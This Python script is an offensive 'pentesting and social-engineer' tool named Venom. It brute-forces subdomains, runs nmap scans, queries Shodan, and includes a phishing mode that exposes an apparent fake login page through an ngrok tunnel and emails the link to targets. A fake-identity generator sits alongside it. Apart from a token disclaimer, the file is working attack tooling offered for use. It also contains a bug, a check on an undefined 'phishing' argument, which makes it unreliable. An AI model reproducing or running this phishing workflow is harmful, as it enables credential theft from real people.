import argparse
import API_Shodan
import subprocess
import lxml.etree as ET
import http.server
import os
import cgi
import nmap
import lxml.html
import SendEmail
import smtplib, ssl
import requests
from lxml import etree
from faker import Faker
from colorama import Fore
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from pyngrok import ngrok

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Ref. https://www.techgeekbuzz.com/how-to-make-a-subdomain-scanner-in-python/
def subdomain_find(domain):
    # Ref Dic. https://github.com/theMiddleBlue/DNSenum/blob/master/wordlist/subdomains-top1mil-20000.txt
    with open("subdomain_dic.txt", "r") as file:
        for subdomain in file.readlines():
            # define subdomain url
            subdomain_url = f"https://{subdomain.strip()}.{domain}"
            try:
                response = requests.get(subdomain_url)

                #200 success code
                if response.status_code==200:
                    print(Fore.GREEN +f"Subdomain Found [+]: {subdomain_url}")
            except:
                pass


def default_scan(Host):
    os.chdir("nmap")
    os.system(f"nmap.exe --open -n -T3 {Host}")
    os.chdir("../")

def full_scan(Host, Ports):
    os.chdir("nmap")
    os.system(f"nmap.exe -sC -sV -n -T3 -p{Ports} {Host} -oX nmap_output.xml")
    os.system("move nmap_output.xml ../")
    os.chdir("../")
    # Ref: http://makble.com/convert-xml-to-html-with-lxml-xslt-in-python
    xslt_doc = etree.parse("report_format.xslt")
    xslt_transformer = etree.XSLT(xslt_doc)
    source_doc = etree.parse("nmap_output.xml")
    output_doc = xslt_transformer(source_doc)
    output_doc.write("scan_report.html", pretty_print=True)

def phishing_atck():
    opt = 1
    while(opt != 0):
        opt = int(input(bcolors.OKCYAN + """1) Email Vector Attack
2) Create a Fake ID
0) Exit
CMD> """ + bcolors.ENDC))
        if opt == 1:
            # https://pyngrok.readthedocs.io/en/latest/index.html
            # <NgrokTunnel: "http://<public_sub>.ngrok.io" -> "http://localhost:80">
            tunnel = ngrok.connect().public_url
            SendEmail.send(tunnel)
            print(tunnel)
            os.chdir("php")
            subprocess.Popen("php.exe -S 127.0.0.1:80 -t ../login")
            input()
            ngrok.disconnect(tunnel)
            break
        elif opt == 2:
            fake = Faker()
            print("Name: ", fake.name())
            print("Email: ", fake.email())
            print("Country: ", fake.country())
            print("Text: ", fake.text())


if __name__ == "__main__":
    print("""          _______  _        _______  _______
|\     /|(  ____ \( (    /|(  ___  )(       )
| )   ( || (    \/|  \  ( || (   ) || () () |
| |   | || (__    |   \ | || |   | || || || |
( (   ) )|  __)   | (\ \) || |   | || |(_)| |
 \ \_/ / | (      | | \   || |   | || |   | |
  \   /  | (____/\| )  \  || (___) || )   ( |
   \_/   (_______/|/    )_)(_______)|/     \|
                                             """)
    print(bcolors.WARNING + "Pentesting and Social-Engineer Tool")
    print(bcolors.WARNING + """Warning: This tool is for educational and testing purposes,
    please use it with discretion. We are not responsible for any use against the law.""" + bcolors.ENDC)
    parser = argparse.ArgumentParser()
    parser.add_argument("-host", dest = "host", help = "Target Specification [Optional if you want to scan a network]")
    parser.add_argument("-ports", dest = "ports", help = "Specify the ports for the network scan")
    parser.add_argument("-subdomains", dest = "domain", help = "This option discover the subdomains of one host or domain")
    parser.add_argument("-shodan", dest = "shodan", help = "Use Shodan API to search public hosts [Optional]")
    parser.add_argument("-s", help = "Social Engineer Mode [Optional]" , action="store_true")
    params = parser.parse_args()
    if params.host and params.ports and not params.phishing:
        full_scan(params.host,params.ports)
    elif params.s:
        phishing_atck()
    elif params.host and not params.ports:
        default_scan(params.host)
    elif params.shodan:
        API_Shodan.search(params.shodan)
    elif params.domain:
        subdomain_find(params.domain)
